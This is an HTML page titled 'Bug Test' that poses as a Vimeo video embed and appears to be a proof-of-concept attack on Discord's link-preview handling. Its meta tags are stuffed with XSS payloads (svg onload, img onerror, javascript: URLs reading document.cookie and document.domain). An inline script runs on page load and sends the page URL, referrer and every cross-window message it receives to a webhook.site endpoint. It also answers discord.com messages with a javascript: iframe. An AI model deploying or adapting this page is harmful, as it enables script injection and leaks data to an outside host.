<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta property="og:site_name" content="Vimeo">
    <meta property="og:url" content="https://vimeo.com/403530213">
    <meta property="og:type" content="video.other">
    <meta property="og:title" content="Please & Thank You"><svg onload=alert(1)>">
    <meta property="og:description" content="Made with love"><img src=x onerror=alert(document.domain)>">
    <meta property="og:image" content="data:image/svg+xml,<svg onload=alert(document.cookie)>">
    <meta property="og:video" content="javascript:alert(1)">
    <meta property="og:video:url" content="https://player.vimeo.com/video/403530213?autoplay=1&h=b2d568c32d">
    <meta property="og:video:secure_url" content="https://player.vimeo.com/video/403530213?autoplay=1&h=b2d568c32d">
    <meta property="og:video:type" content="text/html">
    <meta property="og:video:width" content="-1" onload="alert(1)">
    <meta property="og:video:height" content="javascript:alert(1)">
    <meta name="twitter:card" content="player">
    <meta name="twitter:site" content="@vimeo">
    <meta name="twitter:title" content="Please & Thank You">
    <meta name="twitter:description" content="Made with love">
    <meta name="twitter:image" content="https://i.vimeocdn.com/video/873029368-78a366b9407757e066a37718d766be53d3cb90d7f27708590ca16a1400e95b89-d">
    <meta name="twitter:player" content="javascript:alert(document.domain)">
    <meta name="twitter:player:width" content="640">
    <meta name="twitter:player:height" content="360">
    <meta name="twitter:player:stream" content="https://vimeo.com/403530213">
    <title>Bug Test</title>
    <script src="https://player.vimeo.com/api/player.js"></script>
    <script>
        function logToWebhook(data) {
            const img = new Image();
            img.src = `https://webhook.site/bbeb07ea-30e9-4522-802f-7e6ad1ccb124?data=${encodeURIComponent(JSON.stringify(data))}`;
        }

        async function attemptExploit() {
            try {
                logToWebhook({
                    type: 'page_load',
                    url: window.location.href,
                    referrer: document.referrer,
                    timestamp: new Date().toISOString()
                });

                const frame = document.createElement('iframe');
                frame.src = 'https://player.vimeo.com/video/403530213';
                frame.width = '640';
                frame.height = '360';
                frame.allow = 'autoplay; fullscreen';
                document.getElementById('vimeo-player').appendChild(frame);

                frame.onload = () => {
                    logToWebhook({
                        type: 'frame_loaded',
                        timestamp: new Date().toISOString()
                    });

                    window.parent.postMessage({
                        type: 'DISCORD_EMBED_LOADED',
                        data: {
                            url: 'https://vimeo.com/403530213',
                            width: '640',
                            height: '360'
                        }
                    }, '*');
                };

            } catch(e) {
                logToWebhook({
                    type: 'error',
                    error: e.toString(),
                    stack: e.stack,
                    timestamp: new Date().toISOString()
                });
                console.error('Error:', e);
            }
        }

        window.onmessage = (e) => {
            logToWebhook({
                type: 'message_received',
                origin: e.origin,
                data: e.data,
                timestamp: new Date().toISOString()
            });

            if (e.origin.includes('discord.com')) {
                e.source.postMessage({
                    type: 'DISCORD_EMBED_UPDATE',
                    data: {
                        html: '<iframe src="javascript:alert(document.domain)"></iframe>'
                    }
                }, '*');
            }
        };

        window.onload = attemptExploit;
    </script>
</head>
<body>
    <div id="vimeo-player"></div>
</body>
</html>
